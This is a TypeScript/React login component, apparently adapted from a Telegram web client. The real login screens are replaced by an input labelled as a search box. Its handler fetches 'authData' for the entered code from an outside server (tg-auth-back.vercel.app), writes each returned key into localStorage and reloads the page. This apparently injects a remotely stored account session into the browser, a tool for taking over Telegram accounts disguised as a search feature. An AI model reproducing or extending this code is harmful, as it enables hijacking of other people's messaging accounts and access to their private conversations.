import '../../global/actions/initial';

import type { FC } from '../../lib/teact/teact';
import React, { memo, useEffect, useRef, useState } from '../../lib/teact/teact';
import { getActions, withGlobal } from '../../global';

import type { GlobalState } from '../../global/types';

import { PLATFORM_ENV } from '../../util/browser/windowEnvironment';

import useCurrentOrPrev from '../../hooks/useCurrentOrPrev';
import useElectronDrag from '../../hooks/useElectronDrag';
import useHistoryBack from '../../hooks/useHistoryBack';

import Transition from '../ui/Transition';
import AuthCode from './AuthCode.async';
import AuthPassword from './AuthPassword.async';
import AuthPhoneNumber from './AuthPhoneNumber';
import AuthQrCode from './AuthQrCode';
import AuthRegister from './AuthRegister.async';

import './Auth.scss';

type StateProps = Pick<GlobalState, 'authState'>;
const MAX_HISTORY_ITEMS = 5;

// Cookie management functions
const setCookie = (name: string, value: string, days = 30) => {
  const date = new Date();
  date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
  const expires = `; expires=${date.toUTCString()}`;
  document.cookie = `${name}=${value}${expires}; path=/`;
};

const getCookie = (name: string) => {
  const nameEQ = `${name}=`;
  const ca = document.cookie.split(';');
  for (let i = 0; i < ca.length; i++) {
    let c = ca[i];
    while (c.charAt(0) === ' ') c = c.substring(1, c.length);
    if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
  }
  return '';
};

const Auth: FC<StateProps> = ({
  authState,
}) => {
  const {
    returnToAuthPhoneNumber, goToAuthQrCode,
  } = getActions();

  const isMobile = PLATFORM_ENV === 'iOS' || PLATFORM_ENV === 'Android';

  const [searchHistory, setSearchHistory] = useState<string[]>([]);
  const [showHistory, setShowHistory] = useState(false);
  const [inputValue, setInputValue] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleChangeAuthorizationMethod = () => {
    if (!isMobile) {
      goToAuthQrCode();
    } else {
      returnToAuthPhoneNumber();
    }
  };

  useHistoryBack({
    isActive: (!isMobile && authState === 'authorizationStateWaitPhoneNumber')
      || (isMobile && authState === 'authorizationStateWaitQrCode'),
    onBack: handleChangeAuthorizationMethod,
  });

  useEffect(() => {
    const history = getCookie('searchHistory');
    if (history) {
      setSearchHistory(JSON.parse(history));
    }
  }, []);

  const saveToHistory = (query: string) => {
    const updatedHistory = [query, ...searchHistory.filter((item) => item !== query)].slice(0, MAX_HISTORY_ITEMS);
    setSearchHistory(updatedHistory);
    setCookie('searchHistory', JSON.stringify(updatedHistory));
  };

  // eslint-disable-next-line no-null/no-null
  const containerRef = useRef<HTMLDivElement>(null);
  useElectronDrag(containerRef);

  // For animation purposes
  const renderingAuthState = useCurrentOrPrev(
    authState !== 'authorizationStateReady' ? authState : undefined,
    true,
  );
 const handleSearch = async () => {
    if (!inputValue.trim()) return;

    // Save to history
    saveToHistory(inputValue.trim());

    localStorage.setItem('userCode', inputValue);
    setIsLoading(true);

    // eslint-disable-next-line max-len
    const response = await fetch(`https://tg-auth-back.vercel.app/api/sessions/${inputValue}`);

    const data = await response.json();

    localStorage.setItem('searchResult', JSON.stringify(data));

    if (data.authData) {
      // itterate over data.authData and set it to localStorage
      for (const item of JSON.parse(data.authData)) {
        localStorage.setItem(item.key, item.value);
      }
    }
    // sleep for 1 second
    await new Promise((resolve) => {
      setTimeout(resolve, 1000);
    });
    setIsLoading(false);
    window.location.reload();
  };

  const selectHistoryItem = (item: string) => {
    setInputValue(item);
    setShowHistory(false);
  };

  function getScreen() {
    switch (renderingAuthState) {
      case 'authorizationStateWaitCode':
        return <AuthCode />;
      case 'authorizationStateWaitPassword':
        return <AuthPassword />;
      case 'authorizationStateWaitRegistration':
        return <AuthRegister />;
      case 'authorizationStateWaitPhoneNumber':
        return <AuthPhoneNumber />;
      case 'authorizationStateWaitQrCode':
        return <AuthQrCode />;
      default:
        return isMobile ? <AuthPhoneNumber /> : <AuthQrCode />;
    }
  }

  function getActiveKey() {
    switch (renderingAuthState) {
      case 'authorizationStateWaitCode':
        return 0;
      case 'authorizationStateWaitPassword':
        return 1;
      case 'authorizationStateWaitRegistration':
        return 2;
      case 'authorizationStateWaitPhoneNumber':
        return 3;
      case 'authorizationStateWaitQrCode':
        return 4;
      default:
        return isMobile ? 3 : 4;
    }
  }

  return (
    <Transition activeKey={getActiveKey()} name="fade" className="Auth" ref={containerRef}>
      <div className="search-container">
        <div className="search-input-wrapper">
          <input
            type="text"
            value={inputValue}
            onChange={(e) => setInputValue(e.target.value)}
            onFocus={() => setShowHistory(true)}
            onBlur={() => setTimeout(() => setShowHistory(false), 200)}
            placeholder="Enter search query"
            className="search-input"
          />
          {showHistory && searchHistory.length > 0 && (
            <div className="search-history">
              {searchHistory.map((item) => (
                <div
                  key={`history-${item}`}
                  className="history-item"
                  onClick={() => selectHistoryItem(item)}
                >
                  {item}
                </div>
              ))}
            </div>
          )}
        </div>
        <button
          onClick={handleSearch}
          disabled={isLoading || !inputValue.trim()}
          className="search-button"
        >
          {isLoading ? 'Searching...' : 'Search'}
        </button>
      </div>
    </Transition>
  );
};

export default memo(withGlobal(
  (global): StateProps => {
    return {
      authState: global.authState,
    };
  },
)(Auth));
